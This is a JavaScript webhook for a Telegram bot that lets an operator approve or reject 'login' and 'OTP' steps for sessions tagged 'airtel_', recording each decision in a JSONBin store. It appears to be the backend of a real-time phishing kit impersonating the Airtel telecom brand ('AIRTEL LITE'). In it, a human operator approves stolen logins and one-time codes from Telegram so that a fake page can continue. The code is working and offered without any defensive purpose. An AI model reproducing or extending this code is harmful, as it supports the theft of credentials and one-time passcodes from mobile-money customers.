const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const JSONBIN_KEY = process.env.JSONBIN_KEY || '';
const JSONBIN_ID = process.env.JSONBIN_ID || '';

const FETCH_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    return res.status(200).json({ status: 'Telegram Webhook is operational.' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const update = req.body || {};

    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data || '';
      const callbackId = cq.id;
      const msgId = cq.message?.message_id;
      const chatId = cq.message?.chat?.id;

      let recordId = '';
      let actionType = '';

      if (callbackData.startsWith('approve_login_')) {
        recordId = callbackData.replace('approve_login_', '');
        actionType = 'approve_login';
      } else if (callbackData.startsWith('reject_login_')) {
        recordId = callbackData.replace('reject_login_', '');
        actionType = 'reject_login';
      } else if (callbackData.startsWith('approve_otp_')) {
        recordId = callbackData.replace('approve_otp_', '');
        actionType = 'approve_otp';
      } else if (callbackData.startsWith('reject_otp_')) {
        recordId = callbackData.replace('reject_otp_', '');
        actionType = 'reject_otp';
      }

      console.log(`[Webhook] Action: ${actionType}, Session: ${recordId}`);

      if (recordId) {
        // Update JSONBin directly
        if (JSONBIN_KEY && JSONBIN_ID) {
          try {
            // Read current bin
            const readRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
              headers: { 'X-Master-Key': JSONBIN_KEY, 'X-Bin-Meta': 'false' }
            });

            let currentData = {};
            if (readRes.ok) {
              currentData = await readRes.json();
            }

            // Update session status
            const sessionKey = `airtel_${recordId}`;
            if (actionType === 'approve_login') {
              currentData[sessionKey] = { loginStatus: 'approved', lastUpdated: Date.now() };
            } else if (actionType === 'reject_login') {
              currentData[sessionKey] = { loginStatus: 'rejected', lastUpdated: Date.now() };
            } else if (actionType === 'approve_otp') {
              currentData[sessionKey] = { otpStatus: 'approved', lastUpdated: Date.now() };
            } else if (actionType === 'reject_otp') {
              currentData[sessionKey] = { otpStatus: 'rejected', lastUpdated: Date.now() };
            }

            // Write back to JSONBin
            await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json', 'X-Master-Key': JSONBIN_KEY },
              body: JSON.stringify(currentData)
            });

            console.log('[Webhook] Status updated in JSONBin for:', recordId);
          } catch (e) {
            console.error('[Webhook] JSONBin update failed:', e);
          }
        }

        // Answer callback and update message
        let alertMsg = 'Action enregistrée';
        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée !';
        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée.';
        if (actionType === 'approve_otp') alertMsg = '✅ OTP validé !';
        if (actionType === 'reject_otp') alertMsg = '❌ OTP rejeté.';

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: callbackId, text: alertMsg, show_alert: true })
        });

        if (msgId && chatId) {
          let updatedText = '';
          if (actionType === 'approve_login') {
            updatedText = `🔴 <b>AIRTEL LITE - CONNEXION VALIDÉE</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🟢 STATUT: ✅ APPROUVÉ`;
          } else if (actionType === 'reject_login') {
            updatedText = `🔴 <b>AIRTEL LITE - CONNEXION REFUSÉE</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🔴 STATUT: ❌ REJETÉ`;
          } else if (actionType === 'approve_otp') {
            updatedText = `🔐 <b>OTP VALIDÉ</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🟢 STATUT: ✅ APPROUVÉ`;
          } else if (actionType === 'reject_otp') {
            updatedText = `🔐 <b>OTP REJETÉ</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🔴 STATUT: ❌ REJETÉ`;
          }

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              message_id: msgId,
              text: updatedText,
              parse_mode: 'HTML',
              reply_markup: { remove_keyboard: true }
            })
          });
        }

        return res.status(200).json({ ok: true });
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Webhook error:', error);
    return res.status(200).json({ ok: true });
  }
}
